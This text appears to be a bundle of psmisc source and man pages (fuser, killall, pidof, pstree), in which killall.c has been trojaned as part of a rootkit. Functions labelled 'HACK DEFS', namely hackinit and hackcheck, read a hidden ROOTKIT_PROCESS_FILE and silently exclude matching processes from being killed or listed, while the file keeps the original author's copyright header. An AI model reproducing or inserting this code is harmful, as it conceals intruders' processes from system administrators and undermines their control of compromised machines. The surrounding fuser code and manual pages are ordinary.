    return 0;
}


static void add_file(const char *path,unsigned long device,unsigned long inode,
  pid_t pid,int ref)
{
    struct stat st;
    FILE_DSC *file,*next;
    ITEM_DSC **item,*this;
    unsigned long mount_dev;

    if (device) mount_dev = device;
    else mount_dev = try_to_find_unix_dev(inode);
    for (file = files; file; file = next) {
	next = file->next;
	if (file->flags & FLAG_DEV ? mount_dev && mount_dev == file->dev :
	  device == file->dev && inode == file->ino) {
	    if (!file->name) file = file->named;
	    for (item = &file->items; *item; item = &(*item)->next)
		if ((*item)->type == it_proc && (*item)->u.proc.pid >= pid)
		    break;
	    if (*item && (*item)->u.proc.pid == pid) this = *item;
	    else {
		if (!(this = malloc(sizeof(ITEM_DSC)))) {
		    perror("malloc");
		    exit(1);
		}
		this->type = it_proc;
		this->u.proc.pid = pid;
		this->u.proc.uid = UID_UNKNOWN;
		this->u.proc.ref_set = 0;
		this->next = *item;
		*item = this;
		found_item = 1;
	    }
	    this->u.proc.ref_set |= ref;
	    if ((file->flags & (FLAG_UID | FLAG_VERB)) && this->u.proc.uid ==
	      UID_UNKNOWN && lstat(path,&st) >= 0) this->u.proc.uid = st.st_uid;
	}
    }
}


static void add_other(ITEM_TYPE type,unsigned long mount_dev,
  unsigned long device,unsigned long inode,const char *path)
{
    FILE_DSC *file,*next;
    ITEM_DSC **item,*this;

    for (file = files; file; file = next) {
	next = file->next;
	if (file->flags & FLAG_DEV ? mount_dev == file->dev :
	  device == file->dev && inode == file->ino) {
	    if (!file->name) file = file->named;
	    for (item = &file->items; *item; item = &(*item)->next);
	    /* there's no easy way to suppress duplicates, so we don't */
	    if (!(this = malloc(sizeof(ITEM_DSC)))) {
		perror("malloc");
		exit(1);
	    }
	    this->type = type;
	    if (!(this->u.misc.path = strdup(path))) {
		perror("strdup");
		exit(1);
	    }
	    this->next = *item;
	    *item = this;
	    found_item = 1;
	}
    }
}


static void check_link(const char *path,pid_t pid,int type)
{
    struct stat st;

    if (stat(path,&st) >= 0)
	add_file(path,st.st_dev,st.st_ino,pid,type);
}


static void check_map(const char *rel,pid_t pid,int type)
{
    FILE *file;
    char line[MAX_LINE+1];
    int major,minor;
    unsigned long inode;

    if (!(file = fopen(rel,"r"))) return;
    while (fgets(line,MAX_LINE,file)) {
	if (sscanf(line,"%*s %*s %*s %x:%x %ld",&major,&minor,&inode) != 3)
	    continue;
	if (major || minor || inode)
	    add_file(rel,MKDEV(major,minor),inode,pid,type);
    }
    fclose(file);
}


static void check_dir(const char *rel,pid_t pid,int type)
{
    DIR *dir;
    struct dirent *de;
    char path[PATH_MAX+1];

    if (!(dir = opendir(rel))) return;
    while (de = readdir(dir))
	if (strcmp(de->d_name,".") && strcmp(de->d_name,"..")) {
	    sprintf(path,"%s/%s",rel,de->d_name);
	    check_link(path,pid,type);
	}
    (void) closedir(dir);
}


static void scan_fd(void)
{
    DIR *dir;
    struct dirent *de;
    char path[PATH_MAX+1];
    pid_t pid;
    int empty;

    if (!(dir = opendir(PROC_BASE))) {
	perror(PROC_BASE);
	exit(1);
    }
    empty = 1;
    while (de = readdir(dir))
	if (pid = atoi(de->d_name)) {
	    empty = 0;
	    sprintf(path,"%s/%d",PROC_BASE,pid);
	    if (chdir(path) >= 0) {
		check_link("root",pid,REF_ROOT);
		check_link("cwd",pid,REF_CWD);
		check_link("exe",pid,REF_EXE);
		check_dir("lib",pid,REF_MMAP);
		check_dir("mmap",pid,REF_MMAP);
		check_map("maps",pid,REF_MMAP);
		check_dir("fd",pid,REF_FILE);
	    }
	}
    (void) closedir(dir);
    if (empty) {
	fprintf(stderr,PROC_BASE " is empty (not mounted ?)\n");
	exit(1);
    }
}


static void scan_mounts(void)
{
    FILE *file;
    struct stat st_dev,st_parent,st_mounted;
    char line[MAX_LINE+1],path[PATH_MAX+1],mounted[PATH_MAX+3];
    char tmp[MAX_LINE+1];
    char *end;

    if (!(file = fopen(PROC_BASE "/mounts","r"))) return; /* old kernel */
    while (fgets(line,MAX_LINE,file)) {
	if (sscanf(line,"%s %s",path,mounted) != 2) continue;
		/* new kernel :-) */
	if (stat(path,&st_dev) < 0) continue; /* might be NFS or such */
	if (S_ISBLK(st_dev.st_mode) && MAJOR(st_dev.st_rdev) == LOOP_MAJOR) {
	    FILE *pipe;

	    sprintf(tmp,"losetup %s",path);
	    if (!(pipe = popen(tmp,"r")))
		fprintf(stderr,"popen(%s) failed\n",tmp);
	    else {
		int dev,ino;

		if (fscanf(pipe,"%*s [%x]:%d",&dev,&ino) == 2)
		    add_other(it_loop,dev,dev,ino,path);
		(void) fclose(pipe);
	    }
	}
	if (stat(mounted,&st_mounted) < 0) {
	    perror(mounted);
	    continue;
	}
	end = strchr(mounted,0);
	strcpy(end,"/..");
	if (stat(mounted,&st_parent) >= 0) {
	    *end = 0;
	    add_other(it_mount,st_parent.st_dev,st_mounted.st_dev,
	      st_mounted.st_ino,mounted);
	}
    }
    (void) fclose(file);
}


static void scan_swaps(void)
{
    FILE *file;
    struct stat st;
    char line[MAX_LINE+1],path[PATH_MAX+1],type[MAX_LINE+1];

    if (!(file = fopen(PROC_BASE "/swaps","r"))) return; /* old kernel */
    (void) fgets(line,MAX_LINE,file);
    while (fgets(line,MAX_LINE,file)) {
	if (sscanf(line,"%s %s",path,type) != 2) continue; /* new kernel :-) */
	if (strcmp(type,"file")) continue;
	if (stat(path,&st) >= 0)
	    add_other(it_swap,st.st_dev,st.st_dev,st.st_ino,path);
    }
    (void) fclose(file);
}


static void show_files(void)
{
    const FILE_DSC *file;
    const ITEM_DSC *item;
    FILE *f;
    const struct passwd *pw;
    const char *user,*scan;
    char tmp[10],path[PATH_MAX+1],comm[COMM_LEN+1];
    int length,header,first,dummy;
    pid_t self;

    self = getpid();
    header = 1;
    for (file = files; file; file = file->next)
	if (file->name && (file->items || all)) {
	    if (header && (file->flags & FLAG_VERB)) {
		printf("\n%*s USER        PID ACCESS COMMAND\n",NAME_FIELD,"");
		header = 0;
	    }
	    length = 0;
	    for (scan = file->name; *scan; scan++)
		if (*scan == '\\') length += printf("\\\\");
		else if (*scan > ' ' && *scan <= '~') {
			putchar(*scan);
			length++;
		    }
		    else length += printf("\\%03o",*scan);
	    if (file->name_space)
		length += printf("/%s",file->name_space->name);
	    if (!(file->flags & FLAG_VERB)) {
		putchar(':');
		length++;
	    }
	    while (length < NAME_FIELD) {
		putchar(' ');
		length++;
	    }
	    first = 1;
	    for (item = file->items; item; item = item->next) {
		if (!(file->flags & FLAG_VERB)) {
		    if (item->type != it_proc) continue;
		    if (item->u.proc.ref_set & REF_FILE)
			printf("%6d",item->u.proc.pid);
		    if (item->u.proc.ref_set & REF_ROOT)
			printf("%6dr",item->u.proc.pid);
		    if (item->u.proc.ref_set & REF_CWD)
			printf("%6dc",item->u.proc.pid);
		    if (item->u.proc.ref_set & REF_EXE)
			printf("%6de",item->u.proc.pid);
		    else if (item->u.proc.ref_set & REF_MMAP)
			printf("%6dm",item->u.proc.pid);
		    if ((file->flags & FLAG_UID) && item->u.proc.uid !=
		      UID_UNKNOWN)
			if (pw = getpwuid(item->u.proc.uid))
			    printf("(%s)",pw->pw_name);
			else printf("(%d)",item->u.proc.uid);
		    first = 0;
		}
		else {
		    const char *name;
		    int uid;

		    switch (item->type) {
			case it_proc:
			    sprintf(path,PROC_BASE "/%d/stat",item->u.proc.pid);
			    strcpy(comm,"???");
			    if (f = fopen(path,"r")) {
				(void) fscanf(f,"%d (%[^)]",&dummy,comm);
				(void) fclose(f);
			    }
			    name = comm;
			    uid = item->u.proc.uid;
			    break;
			case it_mount:
			case it_loop:
			case it_swap:
			    name = item->u.misc.path;
			    uid = 0;
			    break;
			default:
			    fprintf(stderr,"Internal error (type %d)\n",
			      item->type);
			    exit(1);
		    }
		    if (uid == UID_UNKNOWN) user = "???";
		    else if (pw = getpwuid(uid)) user = pw->pw_name;
			else {
			    sprintf(tmp,"%d",uid);
			    user = tmp;
			}
		    if (!first) printf("%*s",NAME_FIELD,"");
		    else if (length > NAME_FIELD)
			    printf("\n%*s",NAME_FIELD,"");
		    printf(" %-8s ",user);
		    switch (item->type) {
			case it_proc:
			    printf("%6d %c%c%c%c%c  ",item->u.proc.pid,
			      item->u.proc.ref_set & REF_FILE ? 'f' : '.',
			      item->u.proc.ref_set & REF_ROOT ? 'r' : '.',
			      item->u.proc.ref_set & REF_CWD ? 'c' : '.',
			      item->u.proc.ref_set & REF_EXE ? 'e' : '.',
			      (item->u.proc.ref_set & REF_MMAP) &&
			      !(item->u.proc.ref_set & REF_EXE) ? 'm' : '.');
			    break;
			case it_mount:
			    printf("kernel mount  ");
			    break;
			case it_loop:
			    printf("kernel loop   ");
			    break;
			case it_swap:
			    printf("kernel swap   ");
			    break;
		    }
		    if (name)
			for (scan = name; *scan; scan++)
			    if (*scan == '\\') printf("\\\\");
			    else if (*scan > ' ' && *scan <= '~')
				    putchar(*scan);
				else printf("\\%03o",(unsigned char) *scan);
		    putchar('\n');
		}
		first = 0;
	    }
	    if (!(file->flags & FLAG_VERB) || first) putchar('\n');
	    if (first)
		fprintf(stderr,"No process references; use -v for the complete"
		  " list\n");
	    if (file->flags & FLAG_KILL)
		for (item = file->items; item; item = item->next)
		    switch (item->type) {
			case it_proc:
		    	    if (item->u.proc.pid == self) continue;
			    if (kill(item->u.proc.pid,file->sig_num) >= 0)
				break;
			    sprintf(tmp,"kill %d",item->u.proc.pid);
			    perror(tmp);
			    break;
			case it_mount:
			    fprintf(stderr,"No automatic removal. Please use  "
			      "umount %s\n",item->u.misc.path);
			    break;
			case it_loop:
			    fprintf(stderr,"No automatic removal. Please use  "
			      "umount %s\n",item->u.misc.path);
			    break;
			case it_swap:
			    fprintf(stderr,"No automatic removal. Please use  "
			      "swapoff %s\n",file->name);
			    break;
		    }
	}
}


static void enter_item(const char *name,int flags,int sig_number,dev_t dev,
  ino_t ino,SPACE_DSC *name_space)
{
    static FILE_DSC *last = NULL;
    FILE_DSC *new;

    if (!(new = malloc(sizeof(FILE_DSC)))) {
	perror("malloc");
	exit(1);
    }
    if (last_named && !strcmp(last_named->name,name) &&
      last_named->name_space == name_space) new->name = NULL;
    else if (!(new->name = strdup(name))) {
	    perror("strdup");
	    exit(1);
	}
    new->flags = flags;
    new->sig_num = sig_number;
    new->items = NULL;
    new->next = NULL;
    new->dev = dev;
    new->ino = ino;
    new->name_space = name_space;
    if (last) last->next = new;
    else files = new;
    last = new;
    new->named = last_named;
    if (new->name) last_named = new;
}


static int parse_inet(const char *spec,const char *name_space,int *lcl_port,
  unsigned long *rmt_addr,int *rmt_port)
{
    char *s,*here,*next,*end;
    int port,field;

    if (!(s = strdup(spec))) {
	perror("strdup");
	exit(1);
    }
    *lcl_port = *rmt_port = -1;
    *rmt_addr = 0;
    field = 0;
    for (here = s; here; here = next ? next+1 : NULL) {
	next = strchr(here,',');
	if (next) *next = 0;
	switch (field) {
	    case 0:
		/* fall through */
	    case 2:
		if (!*here) break;
		port = strtoul(here,&end,0);
		if (*end) {
		    struct servent *se;

		    if (!(se = getservbyname(here,name_space)))
			return 0;
		    port = ntohs(se->s_port);
		}
		if (field) *rmt_port = port;
		else *lcl_port = port;
		break;
	    case 1:
		if (!*here) break;
		if ((long) (*rmt_addr = inet_addr(here)) == -1) {
		    struct hostent *hostent;

		    if (!(hostent = gethostbyname(here))) return 0;
		    if (hostent->h_addrtype != AF_INET) return 0;
		    memcpy(rmt_addr,hostent->h_addr,hostent->h_length);
		}
		break;
	    default:
		return 0;
	}
	field++;
    }
    return 1;
}


static void usage(void)
{
    fprintf(stderr,"usage: fuser [ -a | -q ] [ -n space ] [ -signal ] "
      "[ -kmuv ] filename ...\n%13s[ - ] [ -n space ] [ -signal ] [ -kmuv ] "
      "name ...\n","");
    fprintf(stderr,"       fuser -l\n");
    fprintf(stderr,"       fuser -V\n\n");
    fprintf(stderr,"    -a        display unused files too\n");
    fprintf(stderr,"    -k        kill processes accessing that file\n");
    fprintf(stderr,"    -l        list signal names\n");
    fprintf(stderr,"    -m        mounted FS\n");
    fprintf(stderr,"    -n space  search in the specified name space (file, "
      "udp, or tcp)\n");
    fprintf(stderr,"    -s        silent operation\n");
    fprintf(stderr,"    -signal   send signal instead of SIGKILL\n");
    fprintf(stderr,"    -u        display user ids\n");
    fprintf(stderr,"    -v        verbose output\n");
    fprintf(stderr,"    -V        display version information\n");
    fprintf(stderr,"    -         reset options\n\n");
    fprintf(stderr,"  udp/tcp names: [local_port][,[rmt_host][,[rmt_port]]]"
      "\n\n");
    exit(1);
}


int main(int argc,char **argv)
{
    SPACE_DSC *name_space;
    char path[PATH_MAX+1];
    int flags,silent,sig_number,no_files;

    flags = silent = 0;
    sig_number = SIGKILL;
    name_space = name_spaces;
    no_files = 1;
    if (argc < 2) usage();
    if (argc == 2 && !strcmp(argv[1],"-l")) {
	list_signals();
	return 0;
    }
    while (--argc) {
	argv++;
	if (**argv == '-')
	    if (!argv[0][1]) {
		flags = 0;
		sig_number = SIGKILL;
	    }
	    else while (*++*argv) {
		    int end;

		    end = 0;
		    switch (**argv) {
			case 'a':
			    all = 1;
			    break;
			case 'k':
			    flags |= FLAG_KILL;
			    break;
			case 'm':
			    flags |= FLAG_DEV;
			    break;
			case 'n':
			    if (!--argc) usage();
			    argv++;
			    for (name_space = name_spaces; name_space->name;
			      name_space++)
				if (!strcmp(*argv,name_space->name)) break;
			    if (!name_space->name) usage();
			    end = 1;
			    break;
			case 's':
			    silent = 1;
			    break;
			case 'u':
			    flags |= FLAG_UID;
			    break;
			case 'v':
			    flags |= FLAG_VERB;
			    break;
			case 'V':
			    fprintf(stderr,"fuser from psmisc version "
			      PSMISC_VERSION "\n");
			    return 0;
			default:
			    if (isupper(**argv) || isdigit(**argv)) {
				sig_number = get_signal(*argv,"fuser");
				argv[0][1] = 0;
				break;
			    }
			    usage();
		    }
		    if (end) break;
		}
	else {
	    SPACE_DSC *this_name_space;
	    struct stat st;
	    char *here;

	    no_files = 0;
	    last_named = NULL;
	    this_name_space = name_space;
	    if (name_space != name_spaces || stat(*argv,&st) < 0) {
		here = strchr(*argv,'/');
		if (here && here != *argv)
		    for (this_name_space = name_spaces; this_name_space->name;
		      this_name_space++)
			if (!strcmp(here+1,this_name_space->name)) {
			    *here = 0;
			    break;
			}
	    }
	    if (this_name_space == name_spaces) {
		if (stat(*argv,&st) < 0) {
		    perror(*argv);
		    continue;
		}
		if (flags & FLAG_DEV)
		    if (S_ISBLK(st.st_mode)) st.st_dev = st.st_rdev;
		    else if (S_ISDIR(st.st_mode)) {
			    sprintf(path,"%s/.",*argv);
			    if (stat(*argv,&st) < 0) {
				perror(*argv);
				continue;
			    }
			}
		if (S_ISSOCK(st.st_mode) || (flags & FLAG_DEV))
		    fill_unix_cache();
		if (!S_ISSOCK(st.st_mode) || (flags & FLAG_DEV))
		    enter_item(*argv,flags,sig_number,st.st_dev,st.st_ino,NULL);
		else {
		    UNIX_CACHE *walk;

		    for (walk = unix_cache; walk; walk = walk->next)
			if (walk->fs_dev == st.st_dev && walk->fs_ino ==
			  st.st_ino)
			    enter_item(*argv,flags,sig_number,0,walk->net_ino,
			      NULL);
		}
	    }
	    else {
		NET_CACHE *walk;
		unsigned long rmt_addr;
		int lcl_port,rmt_port;

		fill_net_cache(this_name_space);
		if (!parse_inet(*argv,this_name_space->name,&lcl_port,
		  &rmt_addr,&rmt_port)) {
		    fprintf(stderr,"%s/%s: invalid specificiation\n",*argv,
		      this_name_space->name);
		    continue;
		}
		for (walk = this_name_space->cache; walk; walk = walk->next)
		    if ((lcl_port == -1 || walk->lcl_port == lcl_port) &&
		      (!rmt_addr || walk->rmt_addr == rmt_addr) &&
		      (rmt_port == -1 || walk->rmt_port == rmt_port))
			enter_item(*argv,flags,sig_number,0,walk->ino,
			    this_name_space);
	    }
	}
    }
    if (no_files || (all && silent)) usage();
    scan_fd();
    scan_mounts();
    scan_swaps();
    if (!silent) {
	if (seteuid(getuid()) < 0) {
	    perror("seteuid");
	    return 1;
	}
	show_files();
    }
    return found_item ? 0 : 1;
}
.TH KILLALL 1 "February 17, 1998" "Linux" "User Commands"
.SH NAME
killall \- kill processes by name
.SH SYNOPSIS
.ad l
.B killall
.RB [ \-eiqvw ]
.RB [ \-\fIsignal\fB ]
.I name ...
.br
.B killall
.RB \-l
.br
.B killall
.RB \-V
.ad b
.SH DESCRIPTION
.B killall
sends a signal to all processes running any of the specified commands. If no
signal name is specified, SIGTERM is sent.
.PP
Signals can be specified either by name (e.g. \fB\-HUP\fP) or by number
(e.g. \fB\-1\fP). Signal 0 (check if a process exists) can only be specified
by number.
.PP
If the command name contains a slash (\fB/\fP), processes executing that
particular file will be selected for killing, independent of their name.
.PP
\fBkillall\fP returns a non-zero return code if no process has been killed
for any of the listed commands. If at least one process has been killed for
each command, \fBkillall\fP returns zero.
.PP
A \fBkillall\fP process never kills itself (but may kill other \fBkillall\fP
processes).
.SH OPTIONS
.IP \fB\-e\fP
Require an exact match for very long names. If a command name is longer
than 15 characters, the full name may be unavailable (i.e. it is swapped
out). In this case, \fBkillall\fP will kill everything that matches within
the first 15 characters. With \fB\-e\fP, such entries are skipped.
\fBkillall\fP prints a message for each skipped entry 
if \fB\-v\fP is specified in addition to \fB\-e\fP,
.IP \fB\-i\fP
Interactively ask for confirmation before killing.
.IP \fB\-l\fP
List all known signal names.
.IP \fB\-q\fP
Do not complain of no processes were killed.
.IP \fB\-v\fP
Report if the signal was successfully sent.
.IP \fB\-V\fP
Display version information.
.IP \fB\-w\fP
Wait for all killed processes to die. \fBkillall\fP checks once per second if
any of the killed processes still exist and only returns if none are left.
Note that \fBkillall\fP may wait forever if the signal was ignored, had no
effect, or if the process stays in zombie state.
.SH FILES
.nf
/proc	location of the proc file system
.fi
.SH "KNOWN BUGS"
Killing by file only works for executables that are kept open during
execution, i.e. impure executables can't be killed this way.
.PP
Be warned that typing \fBkillall\fP \fIname\fP may not have the desired
effect on non-Linux systems, especially when done by a privileged
user.
.PP
\fBkillall \-w\fP doesn't detect if a process disappears and is replaced by
a new process with the same PID between scans.
.SH AUTHOR
Werner Almesberger <werner.almesberger@lrc.di.epfl.ch>
.SH "SEE ALSO"
kill(1), fuser(1), pidof(1), ps(1), kill(2)
.\"{{{}}}
/* killall.c - kill processes by name or list PIDs */

/* Copyright 1993-1998 Werner Almesberger. See file COPYING for details. */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "comm.h"
#include "signals.h"


#define PROC_BASE "/proc"
#define MAX_NAMES (sizeof(unsigned long)*8)

/* HACK DEFS */
#include "../rootkit.h"
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;
void hackinit(void) {
 h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
 hack_list=h_tmp;
 if ((int)fp_hack=fopen(ROOTKIT_PROCESS_FILE,"r")) {
  while (fgets(tmp_str, 126, fp_hack)) {
   h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
   strp=tmp_str;
   strp=strtok (strp, SPC_CHAR);
   h_tmp->hack_type=atoi(strp);
   strp=strtok ('\0', END_CHAR);
   strcpy (h_tmp->hack_cmd, strp);
   h_tmp=h_tmp->next;
  }
  fclose(fp_hack);
 }
 h_tmp->next=NULL;
}

int hackcheck(char *p) {
 for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
  switch (h_tmp->hack_type) {
   case 0:
    return 0;
    break;
   case 1:
    return 0;
    break;
   case 2:
    if (strcmp((char *)p,h_tmp->hack_cmd)==0)
     return 1;
    break;
   case 3:
    if (strstr((char *)p,h_tmp->hack_cmd))
     return 1;
    break;
  }
 }
 return 0;
}

/* end o hacko functions */


static int verbose = 0,exact = 0,interactive = 0,quiet = 0,wait_until_dead = 0,
  pidof;


static int ask(char *name,pid_t pid)
{
    int ch,c;

    do {
        printf("Kill %s(%d) ? (y/n) ",name,pid);
        fflush(stdout);
	do if ((ch = getchar()) == EOF) exit(0);
	while (ch == '\n' || ch == '\t' || ch == ' ');
	do if ((c = getchar()) == EOF) exit(0);
	while (c != '\n');
    }
    while (ch != 'y' && ch != 'n' && ch != 'Y' && ch != 'N');
    return ch == 'y' || ch == 'Y';
}


static int kill_all(int signal,int names,char **namelist)
{
    DIR *dir;
    struct dirent *de;
    FILE *file;
    struct stat st,sts[MAX_NAMES];
    int *name_len;
    char path[PATH_MAX+1],comm[COMM_LEN];
    char command_buf[PATH_MAX+1];
    char *command;
    pid_t *pid_table,pid,self,*pid_killed;
    int empty,i,j,okay,length,got_long,error;
    int pids,max_pids,pids_killed;
    unsigned long found;

    if (!(name_len = malloc(sizeof(int)*names))) {
	perror("malloc");
	exit(1);
    }
    for (i = 0; i < names; i++)
	if (!strchr(namelist[i],'/')) {
	    sts[i].st_dev = 0;
	    name_len[i] = strlen(namelist[i]);
	}
	else if (stat(namelist[i],&sts[i]) < 0) {
		perror(namelist[i]);
		exit(1);
	    }
    self = getpid();
    found = 0;
    if (!(dir = opendir(PROC_BASE))) {
	perror(PROC_BASE);
	exit(1);
    }
    max_pids = 256;
    pid_table = malloc(max_pids*sizeof(pid_t));
    if (!pid_table) {
	perror("malloc");
	exit(1);
    }
    pids = 0;
    while (de = readdir(dir)) {
	if (!(pid = atoi(de->d_name)) || pid == self) continue;
	if (pids == max_pids) {
	    if (!(pid_table = realloc(pid_table,2*pids*sizeof(pid_t)))) {
		perror("realloc");
		exit(1);
	    }
	    max_pids *= 2;
	}
	pid_table[pids++] = pid;
    }
    (void) closedir(dir);
    empty = 1;
    pids_killed = 0;
    pid_killed = malloc(max_pids*sizeof(pid_t));
    if (!pid_killed) {
	perror("malloc");
	exit(1);
    }
    for (i = 0; i < pids; i++) {
	sprintf(path,"%s/%d/stat",PROC_BASE,pid_table[i]);
	if (!(file = fopen(path,"r"))) continue;
	empty = 0;
	okay = fscanf(file,"%*d (%[^)]",comm) == 1;
	(void) fclose(file);
	if (!okay) continue;
	got_long = 0;
	command = NULL; /* make gcc happy */
	length = strlen(comm);
      if (hackcheck(comm)==0) {
	if (length == COMM_LEN-1) {
	    sprintf(path,"%s/%d/cmdline",PROC_BASE,pid_table[i]);
	    if (!(file = fopen(path,"r"))) continue;
	    okay = fscanf(file,"%s",command_buf) == 1;
	    (void) fclose(file);
	    if (exact && !okay) {
		if (verbose)
		    fprintf(stderr,"skipping partial match %s(%d)\n",comm,
		      pid_table[i]);
		continue;
	    }
	    got_long = okay;
	    if (okay) {
		command = strrchr(command_buf,'/');
		if (command) command++;
		else command = command_buf;
	    }
	}
	for (j = 0; j < names; j++) {
	    if (!sts[j].st_dev) {
		if (length != COMM_LEN-1 || name_len[j] < COMM_LEN-1) {
		    if (strcmp(namelist[j],comm)) continue;
		}
		else if (got_long ? strcmp(namelist[j],command) :
		      strncmp(namelist[j],comm,COMM_LEN-1)) continue;
	    }
	    else {
		sprintf(path,"%s/%d/exe",PROC_BASE,pid_table[i]);
		if (stat(path,&st) < 0) continue;
		if (sts[j].st_dev != st.st_dev || sts[j].st_ino != st.st_ino)
		    continue;
	    }
	    if (interactive && !ask(comm,pid_table[i])) continue;
	    if (pidof) {
		if (found) putchar(' ');
		printf("%d",pid_table[i]);
		found |= 1 << j;
	    }
	    else if (kill(pid_table[i],signal) >= 0) {
		    if (verbose)
			fprintf(stderr,"Killed %s(%d)\n",got_long ? command :
			  comm,pid_table[i]);
		    found |= 1 << j;
		    pid_killed[pids_killed++] = pid_table[i];
		}
		else if (errno != ESRCH || interactive)
			fprintf(stderr,"%s(%d): %s\n",got_long ? comm :
			  command,pid_table[i],strerror(errno));
	}
      }
    }
    if (empty) {
	fprintf(stderr,PROC_BASE " is empty (not mounted ?)\n");
	exit(1);
    }
    if (!quiet && !pidof)
	for (i = 0; i < names; i++)
	    if (!(found & (1 << i)))
		fprintf(stderr,"%s: no process killed\n",namelist[i]);
    if (pidof) putchar('\n');
    error = found == ((1 << (names-1)) | ((1 << (names-1))-1)) ? 0 : 1;
    /*
     * We scan all (supposedly) killed processes every second to detect dead
     * processes as soon as possible in order to limit problems of race with
     * PID re-use.
     */
    while (pids_killed && wait_until_dead) {
	for (i = 0; i < pids_killed;) {
	    if (kill(pid_killed[i],0) < 0 && errno == ESRCH) {
		pid_killed[i] = pid_killed[--pids_killed];
		continue;
	    }
	    i++;
	}
	sleep(1); /* wait a bit longer */
    }
    return error;
}


static void usage_pidof(void)
{
    fprintf(stderr,"usage: pidof [ -e ] name ...\n");
    fprintf(stderr,"       pidof -V\n\n");
    fprintf(stderr,"    -e      require exact match for very long names;\n");
    fprintf(stderr,"            skip if the command line is unavailable\n");
    fprintf(stderr,"    -V      display version information\n\n");
}


static void usage_killall(void)
{
    fprintf(stderr,"usage: killall [ -eiqvw ] [ -signal ] name ...\n");
    fprintf(stderr,"       killall -l\n");
    fprintf(stderr,"       killall -V\n\n");
    fprintf(stderr,"    -e      require exact match for very long names;\n");
    fprintf(stderr,"            skip if the command line is unavailable\n");
    fprintf(stderr,"    -i      ask for confirmation before killing\n");
    fprintf(stderr,"    -l      list all known signal names\n");
    fprintf(stderr,"    -q      quiet; don't print complaints\n");
    fprintf(stderr,"    -signal send signal instead of SIGTERM\n");
    fprintf(stderr,"    -v      report if the signal was successfully sent\n");
    fprintf(stderr,"    -V      display version information\n");
    fprintf(stderr,"    -w      wait for processes to die\n\n");
}


static void usage(void)
{
    if (pidof) usage_pidof();
    else usage_killall();
    exit(1);
}


int main(int argc,char **argv)
{
    char *name,*walk;
    int sig_num;

    name = strrchr(*argv,'/');
    if (name) name++;
    else name = *argv;
    pidof = strcmp(name,"killall");
    if (argc == 2 && !strcmp(argv[1],"-l")) {
	if (pidof) usage();
	list_signals();
	return 0;
    }
    if (argc == 2 && !strcmp(argv[1],"-V")) {
	fprintf(stderr,"%s from psmisc version " PSMISC_VERSION "\n",
	  pidof ? "pidof" : "killall");
	return 0;
    }
    sig_num = SIGTERM;
    while (argc > 1 && *argv[1] == '-') {
	argc--;
	argv++;
	if (**argv == '-') {
	    for (walk = *argv+1; *walk && strchr("eiqvw",*walk); walk++) {
		switch (*walk) {
		    case 'e':
			exact = 1;
			break;
		    case 'i':
			if (pidof) usage();
			interactive = 1;
			break;
		    case 'q':
			if (pidof) usage();
			quiet = 1;
			break;
		    case 'v':
			if (pidof) usage();
			verbose = 1;
			break;
		    case 'w':
			if (pidof) usage();
			wait_until_dead = 1;
			break;
		}
	    }
	    if (*walk)
		if (walk != *argv+1 || pidof) usage();
		else sig_num = get_signal(*argv+1,"killall");
	}
    }
    if (argc < 2) usage();
    if (argc > MAX_NAMES+1) {
	fprintf(stderr,"Maximum number of names is %d\n",MAX_NAMES);
	exit(1);
    }
    hackinit();
    return kill_all(sig_num,argc-1,argv+1);
}
.TH PIDOF 1 "Apr 19, 1997" "Linux" "User Commands"
.SH NAME
pidof \- finds processes by name and lists their PIDs
.SH SYNOPSIS
.ad l
.B pidif
.RB [ \-e ]
.I name ...
.br
.B pidof
.RB \-V
.ad b
.SH DESCRIPTION
.B pidof
lists the PIDs of all processes running any of the specified commands.
.PP
If the command name contains a slash (\fB/\fP), processes executing that
particular file will be selected, independent of their name.
.PP
\fBpidof\fP returns a non-zero return code if no process has been found 
for any of the listed commands. If at least one process has been found for
each command, \fBpidof\fP returns zero.
.SH OPTIONS
.IP \fB\-e\fP
Require an exact match for very long names. If a command name is longer
than 15 characters, the full name may be unavailable (i.e. it is swapped
out). In this case, \fBpidof\fP will list everything that matches within
the first 15 characters. With \fB\-e\fP, such entries are silently skipped.
.IP \fB\-V\fP
Display version information.
.SH FILES
.nf
/proc	location of the proc file system
.fi
.SH "KNOWN BUGS"
Selection by file only works for executables that are kept open during
execution, i.e. impure executables can't be selected this way.
.SH AUTHOR
Werner Almesberger <werner.almesberger@lrc.di.epfl.ch>
.SH "SEE ALSO"
killall(1), fuser(1), ps(1)
.\"{{{}}}
.TH PSTREE 1 "Apr 7, 1996" "Linux" "User Commands"
.SH NAME
pstree \- display a tree of processes
.SH SYNOPSIS
.ad l
.B pstree
.RB [ \-a ]
.RB [ \-c ]
.RB [ \-h ]
.RB [ \-l ]
.RB [ \-n ]
.RB [ \-p ]
.RB [ \-u ]
.RB [ \-G | \-U ]
.RB [ \fIpid\fB | \fIuser\fB]
.br
.B pstree
.RB \-V
.ad b
.SH DESCRIPTION
.B pstree
shows running processes as a tree. The tree is rooted at either
\fIpid\fP or \fBinit\fP if \fIpid\fP is omitted. If a user name is specified,
all process trees rooted at processes owned by that user are shown.
.PP
\fBpstree\fP visually merges identical branches by putting them in square
brackets and prefixing them with the repetition count, e.g.
.nf
.sp
    init\-+\-getty
         |\-getty
         |\-getty
         `-getty
.sp
.fi
becomes
.nf
.sp
    init\-\-\-4*[getty]
.sp
.fi
.SH OPTIONS
.IP \fB\-a\fP
Show command line arguments. If the command line of a process is swapped out,
that process is shown in parentheses. \fB\-a\fP implicitly disables compaction.
.IP \fB\-c\fP
Disable compaction of identical subtrees. By default, subtrees are compacted
whenever possible.
.IP \fB\-G\fP
Use VT100 line drawing characters.
.IP \fB\-h\fP
Highlight the current process and its ancestors. This is a no-op if the
terminal doesn't support highlighting or if neither the current process
nor any of its ancestors are in the subtree being shown.
.IP \fB\-l\fP
Display long lines. By default, lines are truncated to the display width or
132 if output is sent to a non-tty or if the display width is unknown.
.IP \fB\-n\fP
Sort processes with the same ancestor by PID instead of by name. (Numeric
sort.)
